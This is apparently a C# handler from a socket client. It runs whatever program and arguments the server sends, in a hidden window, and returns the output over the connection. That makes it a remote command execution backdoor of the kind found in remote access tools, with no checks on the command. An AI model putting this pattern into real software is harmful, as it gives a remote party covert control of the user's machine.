namespace ConsoleClient.Handle
{
    using ConsoleClient.Packets;
    using MarrySocket.MClient;

    using System;
    using System.Diagnostics;
    public class HandleRun : IHandlePacket
    {
        public void Handle(object receivedClass, ServerSocket serverSocket)
        {
           string rcmd = (String)receivedClass;
           string[] split = rcmd.Split('|');
           rcmd = split[0];
           string args = split[1];

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = rcmd;
            startInfo.Arguments = args;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            Process p = Process.Start(startInfo);
            string outstring = p.StandardOutput.ReadToEnd();
            string errstring = p.StandardError.ReadToEnd();

            
            p.WaitForExit();
       string sendstring = outstring+ "|" + errstring;

            if (!string.IsNullOrEmpty(rcmd))
            {
               serverSocket.SendObject(1004, sendstring);


            }

        
            
        }
    }
}
